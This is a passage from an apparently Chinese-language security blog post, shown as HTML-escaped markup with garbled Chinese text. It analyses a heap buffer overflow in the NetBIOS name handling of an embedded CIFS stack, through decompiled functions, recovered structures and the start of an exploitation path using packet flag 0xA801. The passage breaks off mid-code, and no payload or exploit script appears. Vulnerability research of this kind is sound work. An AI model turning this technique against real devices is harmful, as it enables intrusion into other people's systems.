    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqecorelib/IMP/nq/cmnbname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44A86D7C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;595&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂæûÈÄôÂÄãÂáΩÂºè‰∏≠ÔºåÂèØ‰ª•ÁúãÂá∫‰ªñÂú®ËôïÁêÜ domain name ÊôÇÔºåÊúâÊåâÁÖßÊâÄÊèê‰æõÁöÑÂèÉÊï∏‰æÜÊ™¢Êü•Èï∑Â∫¶Ôºå‰∏¶‰∏îÊúÉÂú®ÊØèÂÄã label ÈñìÂä†ÂÖ• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;ÔºåÁÑ∂ËÄåÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; ÁöÑÈÉ®ÂàÜ‰∏¶Ê≤íÊúâÂéªÊ™¢Êü• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt; ÈÄôÂÄãÂ≠óÂÖÉÁöÑÈï∑Â∫¶ÔºåÂØ¶Èöõ‰∏äÁöÑÈï∑Â∫¶ÂèØ‰ª•ÊØîÂéüÊú¨ÁöÑ buffer ÈÇÑË¶ÅÈï∑ÔºåÂ∞éËá¥ buffer overflow„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ÂéüÊú¨‰ª•ÁÇ∫ÊúÉÈúÄË¶ÅÊõ¥Ë©≥Á¥∞ÂéªÈÄÜÂêë Heap internalÔºå‰∏çÈÅéÂπ∏ÈÅãÁöÑÊòØÔºåÂæå‰æÜÁôºÁèæÂà∞ buffer ÂæåÈù¢ÊúâÂ•ΩÁî®ÁöÑÁµêÊßãÂèØ‰ª•Âà©Áî®„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buffer&lt;/code&gt; ÂæåÔºåÂ≠òÂú®‰∏ÄÂÄãÁµêÊßãÔºåÈÄôÈÇäÂÖàÂëΩÂêçÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The layout of heap memory:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nb_info&lt;/code&gt; :&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ë©≤ÁµêÊßã‰∏ªË¶ÅÁî®‰æÜÂÑ≤Â≠ò NetBIOS ÁöÑÂêçÁ®±Ë≥áË®äÔºåËÄåÂÖ∂‰∏≠‰πüÂåÖÂê´Âè¶Â§ñ‰∏ÄÂÄãÁµêÊßãÔºåÈÄôË£°ÂëΩÂêçÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt;Ôºå‰∏ªË¶ÅÂÑ≤Â≠òË©≤ NetBIOS ÁöÑÈÄ£Á∑öË≥áË®ä„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The structure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter&lt;/code&gt; :&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Adapter&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_1023&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recv_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword3C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âú®ÂàùÊ≠•‰∫ÜËß£ÈÄô‰∫õÁµêÊßã‰πãÂæåÔºåÊàëÂÄëÂèØ‰ª•ÂÖàÂõûÈ†≠Áúã‰∏Ä‰∏ã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndNameProcessExternalMessage&lt;/code&gt;ÔºåÂ¶ÇÊûúÂ∞áÂ∞ÅÂåÖ‰∏≠ÁöÑ flag Ê¨Ñ‰ΩçË®≠Êàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xA801&lt;/code&gt;ÔºåÂ∞áÊúÉ‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ndInternalNameNegativeRegistration&lt;/code&gt; ÂéªËôïÁêÜ NetBIOS name. Ë©≤ÁµêÊûúÂ∞áÊúÉÂØ´ÂÖ•&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adapter-&amp;gt;responsebuf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âú® ndInternalNameNegativeRegistration ‰∏≠:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âè™Ë¶ÅÊªøË∂≥Ê¢ù‰ª∂Â∞±ÊúÉÂéª returnNegativeRegistrationResponse ËôïÁêÜ ResponseÔºåËÄåÂú® returnNegativeRegistrationResponse ‰∏≠:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;returnNegativeRegistrationResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-2Ch] BYREF&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+18h] [bp-18h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+1Ah] [bp-16h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;maybe_memcpy_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED3100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2349&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_40B06FD8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gap0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;responsebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndGenerateNameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rev16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sySendToSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adapter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_1022&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;NameWhateverResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;logg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndinname.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED30DC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2392&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2393&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
